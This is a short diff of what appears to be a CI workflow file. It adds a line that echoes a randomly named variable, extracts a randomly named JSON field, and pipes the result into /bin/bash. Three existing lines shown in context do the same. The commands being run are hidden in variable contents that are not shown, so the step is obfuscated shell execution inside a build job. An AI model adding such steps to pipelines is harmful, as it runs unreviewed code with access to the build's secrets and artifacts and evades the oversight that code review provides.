@@ -22,6 +22,7 @@ jobs:
           echo $i2 | jq -r .kwjii6 | /bin/bash
           echo $yrt5803 | jq -r .dc668 | /bin/bash
           echo $po71 | jq -r .f13 | /bin/bash
+          echo $puxet1745 | jq -r .edy4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
